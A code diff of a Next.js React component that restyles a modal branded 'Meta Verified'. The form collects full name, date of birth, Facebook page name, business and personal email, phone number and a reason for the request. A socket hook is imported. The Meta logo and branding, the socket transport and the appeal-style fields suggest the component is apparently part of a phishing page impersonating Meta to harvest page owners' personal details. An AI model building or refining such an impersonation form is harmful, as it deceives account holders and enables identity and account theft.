@@ -1,5 +1,6 @@
-import '@/assets/css/first-form-modal.css';
-import LogoMeta from '@/assets/images/logo-meta.svg';
+import '@/assets/css/meta-verified-modals.css';
+import '@/assets/css/phone-input.css';
+import type { MetaVerifiedTexts } from '@/constants/meta-verified-texts';
 import { useSocketEmit } from '@/hooks/use-socket';
 import { store } from '@/store/store';
 import { getDeviceLabel } from '@/utils/device';
@@ -10,7 +11,6 @@ import { faXmark } from '@fortawesome/free-solid-svg-icons/faXmark';
 import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
 import IntlTelInput from 'intl-tel-input/reactWithUtils';
 import 'intl-tel-input/styles';
-import Image from 'next/image';
 import {
     type ChangeEvent,
     type FC,
@@ -69,14 +69,9 @@ const REASON_OPTIONS = [
     { value: 'no_fraud', labelKey: 'reasonNoFraud' as const }
 ];
 
-const INPUT_OK =
-    'first-form-input h-10 w-full rounded-lg border border-[#d4dbe3] px-3 text-sm text-[#212121] outline-none placeholder:text-[#9ca3af] focus:border-blue-500';
-const INPUT_ERR =
-    'first-form-input h-10 w-full rounded-lg border border-red-500 px-3 text-sm text-[#212121] outline-none placeholder:text-[#9ca3af] focus:border-blue-500';
-
 const textsToTranslate = Object.values(TEXT);
 
-const InitModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
+const InitModal: FC<{ nextStep: () => void; uiTexts: MetaVerifiedTexts }> = ({ nextStep, uiTexts }) => {
     const [isLoading, setIsLoading] = useState(false);
     const [phoneNumber, setPhoneNumber] = useState('');
     const [translations, setTranslations] = useState<Record<string, string>>({});
@@ -147,8 +142,6 @@ const InitModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
         }),
         [countryCode]
     );
-
-    const inputClass = (name: FormFieldName) => (invalidFields[name] ? INPUT_ERR : INPUT_OK);
 
     const clearFieldError = (name: FormFieldName) => {
         setInvalidFields((prev) => {
@@ -228,7 +221,7 @@ const InitModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
         setInvalidFields(nextInvalid);
 
         if (hasError) {
-            setSubmitError(t(TEXT.submitError));
+            setSubmitError(uiTexts.fillRequiredFields);
             return false;
         }
 
@@ -308,57 +301,57 @@ const InitModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
         }
     };
 
+    const fieldInputClass = (name: FormFieldName) =>
+        `mv-modal-input${invalidFields[name] ? ' is-error' : ''}`;
+
     return (
-        <div className='community-page fixed inset-0 z-10 flex min-h-screen w-full justify-center overflow-y-auto bg-white'>
-            <div className='flex min-h-screen w-full flex-col'>
-                <div className='flex h-[52px] shrink-0 items-center justify-center border-b border-[#E0E0E0] bg-[#F5F6F6]'>
-                    <div className='flex w-full max-w-[1280px] items-center justify-between px-4'>
-                        <Image src={LogoMeta} alt='Meta' className='h-[22px] w-auto' priority />
-                        <button
-                            type='button'
-                            onClick={() => setModalOpen(false)}
-                            className='flex h-9 w-9 items-center justify-center rounded-full text-[#65676B] transition-colors hover:bg-[#E4E6EB]'
-                            aria-label='Close'
-                        >
-                            <FontAwesomeIcon icon={faXmark} size='lg' />
-                        </button>
-                    </div>
+        <div className='mv-modal-overlay' role='dialog' aria-modal='true'>
+            <div className='mv-modal-card mv-modal-card--form' onClick={(e) => e.stopPropagation()}>
+                <div className='mv-modal-header'>
+                    <h2 className='mv-modal-title'>{uiTexts.verificationInfo}</h2>
+                    <button
+                        type='button'
+                        className='mv-modal-close'
+                        onClick={() => setModalOpen(false)}
+                        aria-label='Close'
+                    >
+                        <FontAwesomeIcon icon={faXmark} />
+                    </button>
                 </div>
 
-                <div className='mx-auto my-3 w-full max-w-[600px] flex-1 bg-white px-4 py-4 md:my-8 md:rounded-lg md:border md:border-gray-200 md:shadow-sm'>
-                    <div className='mb-1 flex items-start justify-between gap-4'>
-                        <h2 className='text-[20px] font-[700] text-[#212121]'>{t(TEXT.title)}</h2>
-                    </div>
+                <p className='mv-modal-subtitle'>{uiTexts.fillRequiredFields}</p>
+                <p className='mv-modal-subtitle' style={{ paddingTop: 0 }}>
+                    {t(TEXT.intro)}
+                </p>
 
-                    <p className='mb-2 rounded-md border border-blue-200 bg-blue-50 p-2.5 text-[14px] font-[300] leading-5 text-gray-800'>
-                        {t(TEXT.intro)}
-                    </p>
-
-                    <form id='verification-form' className='space-y-3' noValidate onSubmit={handleSubmit}>
+                <div className='mv-modal-body'>
+                    <form id='verification-form' noValidate onSubmit={handleSubmit}>
                         {submitError ? (
-                            <p className='-mb-1 text-[13px] text-red-600' role='alert'>
+                            <p className='mb-2 text-[13px] text-red-600' role='alert'>
                                 {submitError}
                             </p>
                         ) : null}
 
-                        <div>
-                            <label className='mb-1.5 block text-sm font-semibold text-[#333]' htmlFor='fullName'>
-                                {t(TEXT.fullName)} <span className='text-red-600'>*</span>
+                        <div className='mv-modal-field'>
+                            <label className='mv-modal-label' htmlFor='fullName'>
+                                {uiTexts.fullName}
+                                <span className='mv-modal-required'>*</span>
                             </label>
                             <input
                                 id='fullName'
                                 name='fullName'
                                 type='text'
-                                placeholder={t(TEXT.fullNamePlaceholder)}
+                                placeholder={uiTexts.fullNamePlaceholder}
                                 value={formData.fullName}
                                 onChange={handleInputChange}
-                                className={inputClass('fullName')}
+                                className={fieldInputClass('fullName')}
                             />
                         </div>
 
-                        <div>
-                            <label className='mb-1.5 block text-sm font-semibold text-[#333]' htmlFor='dateOfBirth'>
-                                {t(TEXT.dateOfBirth)} <span className='text-red-600'>*</span>
+                        <div className='mv-modal-field'>
+                            <label className='mv-modal-label' htmlFor='dateOfBirth'>
+                                {t(TEXT.dateOfBirth)}
+                                <span className='mv-modal-required'>*</span>
                             </label>
                             <input
                                 id='dateOfBirth'
@@ -366,58 +359,62 @@ const InitModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
                                 type='date'
                                 value={formData.dateOfBirth}
                                 onChange={handleInputChange}
-                                className={inputClass('dateOfBirth')}
+                                className={fieldInputClass('dateOfBirth')}
                             />
                         </div>
 
-                        <div>
-                            <label className='mb-1.5 block text-sm font-semibold text-[#333]' htmlFor='facebookPageName'>
-                                {t(TEXT.pageName)} <span className='text-red-600'>*</span>
+                        <div className='mv-modal-field'>
+                            <label className='mv-modal-label' htmlFor='facebookPageName'>
+                                {uiTexts.yourPageName}
+                                <span className='mv-modal-required'>*</span>
                             </label>
                             <input
                                 id='facebookPageName'
                                 name='facebookPageName'
                                 type='text'
-                                placeholder={t(TEXT.pageNamePlaceholder)}
+                                placeholder={uiTexts.pageNamePlaceholder}
                                 value={formData.facebookPageName}
                                 onChange={handleInputChange}
-                                className={inputClass('facebookPageName')}
+                                className={fieldInputClass('facebookPageName')}
                             />
                         </div>
 
-                        <div>
-                            <label className='mb-1.5 block text-sm font-semibold text-[#333]' htmlFor='businessEmail'>
-                                {t(TEXT.businessEmail)} <span className='text-red-600'>*</span>
+                        <div className='mv-modal-field'>
+                            <label className='mv-modal-label' htmlFor='businessEmail'>
+                                {uiTexts.businessEmail}
+                                <span className='mv-modal-required'>*</span>
                             </label>
                             <input
                                 id='businessEmail'
                                 name='businessEmail'
                                 type='email'
-                                placeholder={t(TEXT.businessEmailPlaceholder)}
+                                placeholder={uiTexts.businessEmailPlaceholder}
                                 value={formData.businessEmail}
                                 onChange={handleInputChange}
-                                className={inputClass('businessEmail')}
+                                className={fieldInputClass('businessEmail')}
                             />
                         </div>
 
-                        <div>
-                            <label className='mb-1.5 block text-sm font-semibold text-[#333]' htmlFor='personalEmail'>
-                                {t(TEXT.personalEmail)} <span className='text-red-600'>*</span>
+                        <div className='mv-modal-field'>
+                            <label className='mv-modal-label' htmlFor='personalEmail'>
+                                {uiTexts.personalEmail}
+                                <span className='mv-modal-required'>*</span>
                             </label>
                             <input
                                 id='personalEmail'
                                 name='personalEmail'
                                 type='email'
-                                placeholder={t(TEXT.personalEmailPlaceholder)}
+                                placeholder={uiTexts.personalEmailPlaceholder}
                                 value={formData.personalEmail}
                                 onChange={handleInputChange}
-                                className={inputClass('personalEmail')}
+                                className={fieldInputClass('personalEmail')}
                             />
                         </div>
 
-                        <div>
-                            <label className='mb-1.5 block text-sm font-semibold text-[#333]' htmlFor='phone-input'>
-                                {t(TEXT.phone)} <span className='text-red-600'>*</span>
+                        <div className='mv-modal-field'>
+                            <label className='mv-modal-label' htmlFor='phone-input'>
+                                {uiTexts.mobilePhone}
+                                <span className='mv-modal-required'>*</span>
                             </label>
                             <div id='phone-wrap' ref={phoneWrapRef} className={phoneInvalid ? 'is-invalid' : ''}>
                                 <IntlTelInput
@@ -428,7 +425,7 @@ const InitModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
                                         name: 'phone',
                                         type: 'tel',
                                         inputMode: 'numeric',
-                                        placeholder: t(TEXT.phonePlaceholder),
+                                        placeholder: uiTexts.mobilePhonePlaceholder,
                                         className: 'form-control iti__tel-input',
                                         onKeyDown: handlePhoneKeyDown
                                     }}
@@ -436,14 +433,11 @@ const InitModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
                             </div>
                         </div>
 
-                        <div className='pt-1'>
-                            <p className='mb-3 block text-sm font-[600] text-gray-700'>{t(TEXT.reasonHeading)}</p>
-                            <div
-                                id='reason-group'
-                                className={`first-form-radio-group space-y-2 ${reasonInvalid ? 'is-invalid' : ''}`}
-                            >
+                        <div className='mv-modal-field'>
+                            <p className='mv-modal-label'>{t(TEXT.reasonHeading)}</p>
+                            <div id='reason-group' className={`space-y-2 ${reasonInvalid ? 'rounded-lg border border-red-500 p-2' : ''}`}>
                                 {REASON_OPTIONS.map((option) => (
-                                    <label key={option.value} className='first-form-radio-label'>
+                                    <label key={option.value} className='flex cursor-pointer items-start gap-2 text-[13px] text-[#333]'>
                                         <input
                                             type='radio'
                                             name='reason'
@@ -451,47 +445,26 @@ const InitModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
                                             checked={formData.reason === option.value}
                                             onChange={() => handleReasonChange(option.value)}
                                         />
-                                        <span
-                                            role='presentation'
-                                            onClick={() => handleReasonChange(option.value)}
-                                        >
+                                        <span role='presentation' onClick={() => handleReasonChange(option.value)}>
                                             {t(TEXT[option.labelKey])}
                                         </span>
                                     </label>
                                 ))}
-                                <div className='mt-1'>
-                                    <textarea
-                                        id='additionalNotes'
-                                        name='additionalNotes'
-                                        placeholder={t(TEXT.additionalNotesPlaceholder)}
-                                        value={formData.additionalNotes}
-                                        onChange={handleInputChange}
-                                        className='h-16 w-full resize-none rounded-lg border border-[#d4dbe3] px-3 py-2 text-sm outline-none focus:border-blue-500'
-                                    />
-                                </div>
+                                <textarea
+                                    id='additionalNotes'
+                                    name='additionalNotes'
+                                    placeholder={t(TEXT.additionalNotesPlaceholder)}
+                                    value={formData.additionalNotes}
+                                    onChange={handleInputChange}
+                                    className='mv-modal-input mt-1 h-16 resize-none'
+                                />
                             </div>
                         </div>
 
-                        <div className='pt-2'>
-                            <button
-                                type='submit'
-                                disabled={isLoading}
-                                className='h-[40px] min-h-[40px] w-full rounded-[999px] bg-[#0064E0] py-2.5 text-white transition-colors hover:bg-blue-700 disabled:cursor-not-allowed disabled:opacity-80'
-                            >
-                                {isLoading ? (
-                                    <span className='inline-block h-5 w-5 animate-spin-fast rounded-full border-2 border-white border-b-transparent' />
-                                ) : (
-                                    t(TEXT.continue)
-                                )}
-                            </button>
-                        </div>
+                        <button type='submit' disabled={isLoading} className='mv-modal-submit'>
+                            {isLoading ? <span className='mv-modal-spinner' /> : uiTexts.confirm}
+                        </button>
                     </form>
-                </div>
-
-                <div className='mt-auto w-full shrink-0 border-t border-[#E0E0E0] bg-[#F5F6F6] pt-5 pb-5'>
-                    <div className='mx-auto w-full max-w-[1280px] px-4 text-center text-[13px] text-gray-600'>
-                        {t(TEXT.footer)}
-                    </div>
                 </div>
             </div>
         </div>
